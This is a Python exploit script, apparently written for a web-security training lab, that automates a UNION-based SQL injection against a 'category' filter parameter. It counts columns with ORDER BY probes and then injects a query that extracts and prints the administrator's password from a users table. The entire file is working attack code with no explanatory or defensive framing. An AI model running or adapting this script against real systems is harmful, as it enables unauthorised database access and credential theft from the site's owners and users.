import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def get_user_data(s,url,num):
    uri = "/filter?category=users'union+select+'ddsdvd','dsfsdf'--"
    r = s.get(url+uri,verify=False,proxies=proxies)
    if "Internal Server Error" in r.text:
        return False
    print("[+] SQL has two string type columns")
    uri = "/filter?category=users'union+select+username,password+from+users+where+username='administrator'--"
    r = s.get(url+uri,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    if "administrator" in r.text:
        print("[+] SQL administrator password found")
        password = soup.find(text="administrator").parent.findNext("td").contents[0]
        print("[+] SQL admin password: %s" %password)
        return True
    else:
        return False


def get_col_num(s,url):
    uri = "/filter?category=users"
    for i in range(1,50):
        col_num = "'order+by+%s--" %i
        r = s.get(url+uri+col_num,verify=False,proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    num_col = get_col_num(s,url)
    if num_col:
        print("[+] SQL Injection successful, number of columns: "+str(num_col))
    else:
        print("[-] SQL Injection unsuccessfull")
        sys.exit(-1)
    
    col_data = get_user_data(s,url,num_col)